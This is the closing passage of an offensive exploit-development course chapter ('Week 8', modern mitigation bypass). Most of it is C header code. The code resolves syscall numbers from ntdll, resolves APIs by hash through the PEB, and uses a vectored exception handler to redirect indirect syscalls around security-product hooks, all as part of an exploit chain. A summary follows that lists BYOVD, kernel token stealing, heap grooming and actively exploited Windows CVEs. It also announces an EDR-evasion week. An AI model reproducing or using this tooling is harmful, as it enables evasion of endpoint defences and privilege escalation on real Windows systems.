    for (int i = 0; i < 62; i++) {
        BOOL foundSyscall = FALSE;

        if (code[i] == 0x0F && code[i+1] == 0x05) {
            foundSyscall = TRUE;
        }
        else if (code[i] == 0x48 && code[i+1] == 0x0F && code[i+2] == 0x05) {
            foundSyscall = TRUE;
        }

        if (foundSyscall) {
            for (int j = i - 10; j < i; j++) {
                if (j >= 0 && code[j] == 0xB8) {
                    entry->ssn = *(DWORD*)(code + j + 1);
                    entry->syscallAddr = (PVOID)funcAddr;
                    entry->resolved = TRUE;
                    return TRUE;
                }
            }
        }
    }

    return FALSE;
}

static BOOL InitializeGlobalSyscalls(void) {
    BOOL r1 = ResolveSyscall("NtCreateFile", &g_Syscall_NtCreateFile);
    if (!r1) printf("[-] Failed to resolve indirect syscall: NtCreateFile\n");

    BOOL r2 = ResolveSyscall("NtDeviceIoControlFile", &g_Syscall_NtDeviceIoControlFile);
    if (!r2) printf("[-] Failed to resolve indirect syscall: NtDeviceIoControlFile\n");

    BOOL r3 = ResolveSyscall("NtQuerySystemInformation", &g_Syscall_NtQuerySystemInformation);
    if (!r3) printf("[-] Failed to resolve indirect syscall: NtQuerySystemInformation\n");

    return r1 && r2 && r3;
}

static BOOL InitializeGlobalAPIs(void) {
    HMODULE hNtdll = GetNtdllHandleFromPEB();
    if (!hNtdll) {
        printf("[-] Failed to find ntdll\n");
        return FALSE;
    }

    BOOL allResolved = TRUE;

    g_fnNtCreateFile = (pNtCreateFile_t)ResolveAPI(hNtdll, HashAPI("NtCreateFile"));
    if (!g_fnNtCreateFile) {
        printf("[-] Failed to resolve NtCreateFile\n");
        allResolved = FALSE;
    }

    g_fnNtDeviceIoControlFile = (pNtDeviceIoControlFile_t)ResolveAPI(hNtdll, HashAPI("NtDeviceIoControlFile"));
    if (!g_fnNtDeviceIoControlFile) {
        printf("[-] Failed to resolve NtDeviceIoControlFile\n");
        allResolved = FALSE;
    }

    g_fnRtlGetVersion = (pRtlGetVersion_t)ResolveAPI(hNtdll, HashAPI("RtlGetVersion"));
    if (!g_fnRtlGetVersion) {
        printf("[-] Failed to resolve RtlGetVersion\n");
        allResolved = FALSE;
    }

    g_fnNtQuerySystemInformation = (pNtQuerySystemInformation_t)ResolveAPI(hNtdll, HashAPI("NtQuerySystemInformation"));
    if (!g_fnNtQuerySystemInformation) {
        printf("[-] Failed to resolve NtQuerySystemInformation\n");
        allResolved = FALSE;
    }

    return allResolved;
}

static ULONG_PTR g_VehSyscallAddr = 0;

typedef struct _VEH_SSN_CACHE {
    DWORD NtDeviceIoControlFile;
    DWORD NtCreateFile;
    BOOL Initialized;
} VEH_SSN_CACHE;

static VEH_SSN_CACHE g_VehSsnCache = {0};

static LONG WINAPI VehSyscallHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode != EXCEPTION_ACCESS_VIOLATION) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    ExceptionInfo->ContextRecord->R10 = ExceptionInfo->ContextRecord->Rcx;

    DWORD ssn = 0;
    if (ExceptionInfo->ContextRecord->Rip == 1) {
        ssn = g_VehSsnCache.NtDeviceIoControlFile;
    } else if (ExceptionInfo->ContextRecord->Rip == 2) {
        ssn = g_VehSsnCache.NtCreateFile;
    } else {
        ssn = (DWORD)ExceptionInfo->ContextRecord->Rip;
    }

    ExceptionInfo->ContextRecord->Rax = ssn;
    ExceptionInfo->ContextRecord->Rip = g_VehSyscallAddr;  // Jump to syscall instruction

    return EXCEPTION_CONTINUE_EXECUTION;
}

static BYTE* FindVehSyscallInstruction(ULONG_PTR baseAddr) {
    const int MAX_SEARCH = 64;
    BYTE* funcBase = (BYTE*)baseAddr;
    BYTE* tempBase = NULL;
    int searched = 0;
    while (*funcBase != 0xC3 && searched < MAX_SEARCH) {
        tempBase = funcBase;

        if (*tempBase == 0x0F) {
            tempBase++;
            if (*tempBase == 0x05) {  // syscall instruction
                tempBase++;
                if (*tempBase == 0xC3) {  // ret instruction
                    return funcBase;  // Return address of syscall
                }
            }
        }

        funcBase++;
        tempBase = NULL;
        searched++;
    }

    return NULL;
}

static BOOL ResolveVehSyscallSsn(const char* funcName, DWORD* pSsn) {
    HMODULE hNtdll = GetNtdllHandleFromPEB();
    if (!hNtdll) return FALSE;

    PVOID funcAddr = ResolveAPI(hNtdll, HashAPI(funcName));
    if (!funcAddr) return FALSE;

    BYTE* code = (BYTE*)funcAddr;
    if (code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1 && code[3] == 0xB8) {
        *pSsn = *(DWORD*)(code + 4);
        return TRUE;
    }
    if (code[0] == 0xB8) {
        *pSsn = *(DWORD*)(code + 1);
        return TRUE;
    }
    for (int i = 0; i < 32; i++) {
        if (code[i] == 0xB8) {
            DWORD potentialSsn = *(DWORD*)(code + i + 1);
            if (potentialSsn < 0x1000) {  // SSNs are typically < 4096
                *pSsn = potentialSsn;
                return TRUE;
            }
        }
    }

    return FALSE;
}

static PVOID InitializeVehSyscalls() {
    HMODULE hNtdll = GetNtdllHandleFromPEB();
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle for VEH syscalls\n");
        return NULL;
    }

    if (!ResolveVehSyscallSsn("NtDeviceIoControlFile", &g_VehSsnCache.NtDeviceIoControlFile)) {
        printf("[-] Failed to resolve NtDeviceIoControlFile SSN\n");
        return NULL;
    }
    printf("[+] NtDeviceIoControlFile SSN: 0x%X\n", g_VehSsnCache.NtDeviceIoControlFile);

    if (!ResolveVehSyscallSsn("NtCreateFile", &g_VehSsnCache.NtCreateFile)) {
        printf("[-] Failed to resolve NtCreateFile SSN\n");
        return NULL;
    }
    printf("[+] NtCreateFile SSN: 0x%X\n", g_VehSsnCache.NtCreateFile);

    g_VehSsnCache.Initialized = TRUE;

    FARPROC pNtDrawText = GetProcAddress(hNtdll, "NtDrawText");
    if (!pNtDrawText) {
        pNtDrawText = GetProcAddress(hNtdll, "NtQueryInformationProcess");
        if (!pNtDrawText) {
            printf("[-] Failed to find reference function for VEH syscalls\n");
            return NULL;
        }
    }

    BYTE* syscallAddr = FindVehSyscallInstruction((ULONG_PTR)pNtDrawText);
    if (!syscallAddr) {
        printf("[-] Failed to find syscall instruction\n");
        return NULL;
    }

    g_VehSyscallAddr = (ULONG_PTR)syscallAddr;

    PVOID vehHandle = AddVectoredExceptionHandler(1, VehSyscallHandler);
    if (!vehHandle) {
        printf("[-] Failed to register VEH handler\n");
        return NULL;
    }

    printf("[+] VEH syscalls initialized\n");
    printf("[+] Syscall address: 0x%p\n", (PVOID)g_VehSyscallAddr);

    return vehHandle;
}

static VOID CleanupVehSyscalls(PVOID vehHandle) {
    if (vehHandle) {
        RemoveVectoredExceptionHandler(vehHandle);
        printf("[+] VEH handler removed\n");
    }
    g_VehSyscallAddr = 0;
}

typedef NTSTATUS (NTAPI *pVehNtDeviceIoControlFile_t)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG IoControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength
);

typedef NTSTATUS (NTAPI *pVehNtCreateFile_t)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

static pVehNtDeviceIoControlFile_t pVehNtDeviceIoControlFile = (pVehNtDeviceIoControlFile_t)1;
static pVehNtCreateFile_t pVehNtCreateFile = (pVehNtCreateFile_t)2;

#endif // SYSCALLS_H
```

#### win_version.h

```c
// headers\win_version.h
#ifndef WIN_VERSION_H
#define WIN_VERSION_H

#include "exploit_common.h"
#include "syscalls.h"
#include <stdio.h>

typedef struct _WINDOWS_VERSION {
    DWORD major;
    DWORD minor;
    DWORD build;
    char  version_name[64];
    BOOL  is_windows11;
    BOOL  has_enhanced_heap;
} WINDOWS_VERSION;

static BOOL DetectWindowsVersion(WINDOWS_VERSION* pVersion) {
    if (!pVersion) return FALSE;

    HMODULE hNtdll = GetNtdllHandleFromPEB();
    if (!hNtdll) return FALSE;

    pRtlGetVersion_t RtlGetVersion =
        (pRtlGetVersion_t)ResolveAPI(hNtdll, HashAPI("RtlGetVersion"));
    if (!RtlGetVersion) {
        RtlGetVersion = (pRtlGetVersion_t)GetProcAddress(hNtdll, "RtlGetVersion");
    }
    if (!RtlGetVersion) return FALSE;

    RTL_OSVERSIONINFOW versionInfo = {0};
    versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);

    NTSTATUS status = RtlGetVersion(&versionInfo);
    if (status != 0) return FALSE;

    pVersion->major = versionInfo.dwMajorVersion;
    pVersion->minor = versionInfo.dwMinorVersion;
    pVersion->build = versionInfo.dwBuildNumber;

    if (pVersion->major == 10) {
        if (pVersion->build >= 22000) {
            strcpy_s(pVersion->version_name, sizeof(pVersion->version_name), "Windows 11");
            pVersion->is_windows11 = TRUE;
            pVersion->has_enhanced_heap = (pVersion->build >= 22621);
        } else {
            strcpy_s(pVersion->version_name, sizeof(pVersion->version_name), "Windows 10");
            pVersion->is_windows11 = FALSE;
            pVersion->has_enhanced_heap = (pVersion->build >= 19041);
        }
    } else {
        strcpy_s(pVersion->version_name, sizeof(pVersion->version_name), "Unknown");
        pVersion->is_windows11 = FALSE;
        pVersion->has_enhanced_heap = FALSE;
    }

    return TRUE;
}

static void PrintWindowsVersion(const WINDOWS_VERSION* pVersion) {
    if (!pVersion) return;
    printf("[+] Detected: %s (Build %lu)\n", pVersion->version_name, pVersion->build);
    printf("[+] Enhanced heap protections: %s\n",
           pVersion->has_enhanced_heap ? "Yes" : "No");
}

#endif // WIN_VERSION_H
```

## Summary

Week 8 covered modern mitigation bypass techniques:

- **Day 1**: ASLR/KASLR bypass using prefetch side-channels, BYOVD (RTCore64/eneio64), format string leaks, and heap over-reads for arbitrary kernel R/W primitives
- **Day 2**: Control-flow hijacking with JOP/COP/COOP to bypass Intel CET shadow stacks, Windows CFG/XFG, and kernel CFG (kCFG)
- **Day 3**: Windows heap exploitation defeating LFH randomization and Segment Heap mitigations using timing oracles and heap feng shui
- **Day 4**: Windows CLFS/KTM and AFD.sys exploitation (actively exploited CVE-2025-29824, CVE-2025-32709) with pool grooming techniques
- **Day 5**: Data-only attacks and Win32k exploitation for HVCI/ACG era - token stealing without code execution (primary 2026 technique)
- **Day 6**: Linux cross-cache attacks with SLUBStick, pipe_buffer/msg_msg exploitation, and io_uring rootkit techniques
- **Day 7**: Final project - complete exploitation chain integrating techniques from Days 1-6

**Key Principles**:

- Use only 2026-viable techniques (no deprecated methods)
- Focus on reliability (>80% success rate for Windows, >90% for SLUBStick)
- Understand why techniques work(BYOVD bypasses HVCI/VBS, data-only bypasses CFG/CET)
- Always provide detection signatures for defenders (YARA, ETW, Sigma rules)
- Document technique selection rationale and failure modes

**Key Takeaways**:

- **BYOVD + Data-Only** is the most reliable 2026 technique (bypasses HVCI, VBS, CFG, CET, ACG)
- **JOP/COP** remains viable for CET bypass but requires precise gadget chains
- **Heap exploitation** is probabilistic (40-60% success) due to LFH/Segment Heap randomization
- **CLFS/AFD.sys** actively exploited by APTs despite patches (complex attack surface)
- **SLUBStick** achieves deterministic Linux exploitation (99% vs 10-30% traditional)
- **Detection** focuses on behavioral patterns (excessive allocations, driver loads, IOCTL sequences)

**Next Steps**:

- Week 9: Advanced Fuzzing Techniques
- Week 10: EDR Evasion
- Week 11: Kernel Exploitation Deep Dive

<!-- Written by AnotherOne from @Pwn3rzs Telegram channel -->
